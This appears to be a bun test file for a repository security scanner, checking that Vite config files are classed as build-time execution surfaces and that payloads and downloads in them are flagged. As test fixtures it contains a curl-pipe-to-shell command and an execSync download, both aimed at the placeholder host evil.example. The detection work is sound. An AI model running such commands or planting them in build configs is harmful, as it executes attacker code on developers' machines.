import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Vite config is an install surface", () => {
  // Vite resolves its configuration by evaluating vite.config.<ext> as
  // code on every dev, build and preview run — build-time execution in
  // the same sense the Jenkinsfile and the Makefiles already classify
  // for. It keeps the source surface it already had; the name alone
  // decides, for every extension Vite loads and wherever the project
  // root sits.
  for (const path of [
    "vite.config.ts",
    "vite.config.js",
    "vite.config.mjs",
    "app/vite.config.cts",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("vite.config.ts", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["vite.config.ts:unsafe-execution:high"]);
});

test("an install-time download inside a Vite config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on it
  // but the same bytes recorded no download and left no gap: a scan could
  // read clean over a fetch Vite would have run while building.
  const inspection = inspected(
    "vite.config.ts",
    "import { defineConfig } from 'vite';\nimport { execSync } from 'node:child_process';\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nexport default defineConfig({});\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Vite config keeps no finding", () => {
  const inspection = inspected(
    "vite.config.ts",
    "import { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\nexport default defineConfig({ plugins: [react()] });\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
